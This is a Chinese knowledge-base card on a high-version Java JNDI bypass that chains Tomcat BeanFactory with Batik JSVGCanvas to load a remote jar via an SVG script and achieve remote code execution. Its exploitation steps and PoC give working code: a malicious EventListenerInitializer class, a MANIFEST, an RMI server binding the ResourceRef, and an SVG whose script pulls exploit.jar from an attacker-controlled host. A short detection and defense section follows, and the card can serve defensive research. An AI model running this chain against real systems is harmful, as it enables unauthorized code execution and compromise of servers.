---
id: web-java-deserialization-jndi-batik-jsvgcanvas-beanfactory-svg-jar
title: 高版本 JNDI 绕过：Tomcat BeanFactory + Batik JSVGCanvas 解析 SVG 脚本加载远程 Jar（SVG-Handler-Class）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-beanfactory-batik-jsvgcanvas-svg-jar
tags:
- java
- jndi
- rmi
- ldap
- tomcat
- beanfactory
- batik
- svg
- jdk17
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:54:23+08:00'
  notes: 已对照原文与图04核对：ResourceRef(org.apache.batik.swing.JSVGCanvas, BeanFactory)+URI属性、setURI→loadSVGDocument→BaseScriptingEnvironment.loadScripts、script type=application/java-archive、DocumentJarClassLoader读MANIFEST、Script-Handler/SVG-Handler-Class→ScriptHandler.run/EventListenerInitializer.initializeEventListeners、LDAP变体javaSerializedData均与原文一致；版本按截图记batik1.14/tomcat-embed-core 10.1.31并注明正文10.3.31差异；图04 MANIFEST确认SVG-Handler-Class；dedup最高候选BeanFactory+ELProcessor为不同目标类
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-batik-jsvgcanvas-beanfactory-svg-jar/
draft: false
kb_aliases:
- Batik JSVGCanvas JNDI
- Tomcat BeanFactory Batik
- SVG-Handler-Class
- Script-Handler
- EventListenerInitializer
- application/java-archive
- DocumentJarClassLoader
- CVE-2023-21939 组合拳
---

## 一句话结论

在高版本 JDK 的 JNDI 注入中，若目标 classpath 同时有 Tomcat（`org.apache.naming.factory.BeanFactory`）与 Batik（`org.apache.batik.swing.JSVGCanvas`），可让 RMI/LDAP 返回一个 `ResourceRef("org.apache.batik.swing.JSVGCanvas", ..., "org.apache.naming.factory.BeanFactory", null)`，并把 `URI` 属性指向攻击者的 SVG；BeanFactory 实例化 JSVGCanvas 后调用 `setURI → loadSVGDocument`，Batik 解析 SVG 里的 `<script type="application/java-archive">`，从远程 jar 的 `SVG-Handler-Class`（或 `Script-Handler`）加载并执行 `EventListenerInitializer`（或 `ScriptHandler`），实现无需 JNDI 远程 codebase 的 RCE。

## 原理

- **高版本 JNDI 的限制**：JDK 8u191+/JDK 11+/JDK 17 默认关闭 `com.sun.jndi.ldap.object.trustURLCodebase` 与 `com.sun.jndi.rmi.object.trustURLCodebase`，JNDI 不再从远程 codebase 加载 Reference 指定的工厂/对象类；必须使用目标 classpath 里已有的本地工厂类（`Reference.getFactoryClassName()`），这是“高版本 JNDI 绕过”的前提。
- **Tomcat BeanFactory 本地工厂**：`org.apache.naming.factory.BeanFactory` 是 tomcat-embed-core 自带的 `ObjectFactory`。它对 `ResourceRef` 的 `BeanClassName` 调用无参构造，然后遍历 RefAddr，按属性名找 setter（`set<Name>`）并用属性值调用；`forceString` 可把任意 setter 映射到任意方法。因此只要目标 classpath 有 BeanFactory，就能实例化任意本地类并调用它的 setter。
- **Batik JSVGCanvas 的 setURI**：`org.apache.batik.swing.JSVGCanvas` 的 `setURI(String newURI)` 会保存 URI 并调用 `loadSVGDocument(this.uri)`，交给 Batik 解析远程 SVG。攻击者把 `URI` 设为 `http://attacker/1.xml`，内容完全可控。
- **SVG 脚本加载**：Batik 的 `BaseScriptingEnvironment.loadScripts()` 遍历 SVG 中 `http://www.w3.org/2000/svg` 命名空间的 `<script>` 元素。对 `type="application/java-archive"`，`loadScript` 会取 `xlink:href`，构造 `DocumentJarClassLoader`，读取远程 jar 的 `META-INF/MANIFEST.MF`：
  - 若存在 `Script-Handler`，反射实例化该类并调用 `ScriptHandler.run(document, window)`；
  - 若存在 `SVG-Handler-Class`，反射实例化该类并调用 `EventListenerInitializer.initializeEventListeners(SVGDocument)`。
  恶意 jar 只需实现其中一个接口，在方法里执行命令即可。
- **为什么能绕过 JNDI 高版本限制**：JNDI 只负责返回一个本地工厂（BeanFactory）和属性，真正的类加载由目标 classpath 的 Batik 发起；远程 jar 是 Batik 的 `DocumentJarClassLoader` 从 SVG script 的 `xlink:href` 下载的，不经过 JNDI 的 `trustURLCodebase` 限制。Tomcat 的 BeanFactory 和 Batik 都是目标已有依赖，`ResourceRef` 不需要 `factoryClassLocation`。
- **触发入口**：任何能把攻击者构造的 `Reference` 交给目标 JNDI 的入口都可触发：RMI registry 绑定 `ReferenceWrapper(ResourceRef)`、LDAP 返回带 `javaSerializedData`/`javaNamingReference` 的条目、或应用自身的 JNDI 注入点。原 CTF 中通过 OracleCachedRowSet 反序列化走 RMI 到达该出口。
- **版本边界**：原文依赖列表为 batik 1.14、tomcat-embed-core/el 10.1.31（正文写 10.3.31，截图依赖列表显示 10.1.31）；文章引用 `CVE-2023-21939` 的 batik 低版本 + tomcat-el 组合思路。Batik 新版若对 script jar 的来源/类型做限制，需按实际版本验证；Tomcat BeanFactory 的 setter 调用能力也可能受版本/安全配置影响。

## 触发条件

- 目标 JVM 存在高版本 JNDI 注入点，且攻击者能控制 JNDI 服务端返回的 `Reference`/`ResourceRef`（RMI 或 LDAP）。
- 目标 classpath 含 `tomcat-embed-core`（`org.apache.naming.factory.BeanFactory`）与 Batik（`org.apache.batik.swing.JSVGCanvas`、`batik-script`、`batik-svg-dom` 等）。
- 目标能访问攻击者的 HTTP 服务（SVG 与 jar），且 Batik 被允许加载 `application/java-archive` 脚本。
- 未对 `org.apache.naming.factory.BeanFactory`、`org.apache.batik.*`、`java.lang.reflect.Proxy` 等做 JNDI/反序列化白名单拦截。
- JDK 版本不限（高版本 JNDI 的 codebase 限制不影响本链，因为类由本地 Batik 加载）。

## 利用步骤

1. 编写恶意类 `Main`，实现 `org.w3c.dom.svg.EventListenerInitializer`，在 `initializeEventListeners(SVGDocument)` 中执行命令（或实现 `org.apache.batik.script.ScriptHandler` 的 `run` 方法）。
2. 打包 jar，`META-INF/MANIFEST.MF` 写入 `Main-Class: Main` 与 `SVG-Handler-Class: Main`（或 `Script-Handler: Main`）。
3. 启动 HTTP 服务托管 jar 与 SVG；SVG 内容包含 `<script type="application/java-archive" xlink:href="http://attacker/exploit.jar"/>`。
4. 启动 RMI registry（或 LDAP 服务），绑定 `ResourceRef`：
   ```java
   ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "",
           true, "org.apache.naming.factory.BeanFactory", null);
   ref.add(new StringRefAddr("URI", "http://attacker/1.xml"));
   registry.bind("remoteobj", new ReferenceWrapper(ref));
   ```
5. 通过目标 JNDI 注入/反序列化链让目标 lookup `rmi://attacker:1097/remoteobj`（或 LDAP 对应条目）。
6. Tomcat BeanFactory 实例化 JSVGCanvas 并调用 `setURI("http://attacker/1.xml")`；Batik 下载并解析 SVG，加载远程 jar，按 `SVG-Handler-Class` 实例化 `Main` 并调用 `initializeEventListeners`，执行命令。
7. 原文提示该链可能需要多试几次/调整时序；以命令执行结果为准。

## PoC

恶意类：

```java
import java.io.IOException;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.EventListenerInitializer;

public class Main implements EventListenerInitializer {
    @Override
    public void initializeEventListeners(SVGDocument svgDocument) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        System.out.println("Hello");
    }
}
```

MANIFEST：

```text
Manifest-Version: 1.0
Main-Class: Main
SVG-Handler-Class: Main
```

RMI 服务端：

```java
Registry registry = LocateRegistry.createRegistry(1097);
ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("URI", "http://localhost:8886/1.xml"));
registry.bind("remoteobj", new ReferenceWrapper(ref));
```

SVG：

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0">
  <script type="application/java-archive" xlink:href="http://localhost:8887/exploit.jar"/>
  <text>Static text ...</text>
</svg>
```

LDAP 变体：在 LDAP 条目中放 `javaClassName=java.lang.String` 与 `javaSerializedData=serialize(ResourceRef)`（或 `javaNamingReference`），效果相同。

## 变体与关联

- **ELProcessor 版本**：[[web-java-deserialization-jndi-high-version-beanfactory-el]] 用同一个 Tomcat BeanFactory 本地工厂，但目标类是 `javax.el.ELProcessor`，通过 `forceString=x=eval` 直接执行 EL；本卡换成 Batik JSVGCanvas，适用于 EL 不可用/被拦截或想走脚本 jar 的场景。
- **其他本地工厂**：[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]、[[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]、[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]] 展示了 c3p0/ViburDBCP/Tomcat DataSourceFactory 等不同本地工厂；本卡是“BeanFactory + Batik”组合。
- **反序列化触发**：[[web-java-deserialization-jndi-oracle-rowset-jdk17-pojo-proxy-rmi]] 展示如何用 Oracle RowSet 反序列化走到本卡的 RMI JNDI 出口。
- **低版本 JNDI**：[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]] 依赖远程 codebase；本卡不依赖 `trustURLCodebase`，用于高版本。
- **边界**：目标无 Batik/Tomcat、Batik 禁止 `application/java-archive`、SVG script 的 `xlink:href` 被限制、无法出网到 SVG/jar、或 JNDI 返回值被工厂白名单过滤时链不成立。

## 检测与防御

- **检测**：JNDI/RMI/LDAP 返回的 `Reference` 中出现 `org.apache.batik.swing.JSVGCanvas` + `org.apache.naming.factory.BeanFactory`；进程访问远程 SVG/jar；Batik 的 `DocumentJarClassLoader` 加载外部 jar；SVG 中出现 `application/java-archive` 类型的 script。
- **防御**：升级/移除不必要的 Batik 与 Tomcat 本地工厂依赖；JNDI 使用白名单工厂类，禁用 `org.apache.naming.factory.BeanFactory` 等可利用工厂；限制出站 HTTP；对反序列化/JNDI 输入做类白名单；高版本 JDK 保持 `trustURLCodebase=false`（本链不依赖它，但可减少其他攻击面）。
- **响应**：排查 JNDI 出站与远程 jar 下载、Batik/SVG 解析日志、异常 `EventListenerInitializer` 类加载；隔离主机并审计 classpath。
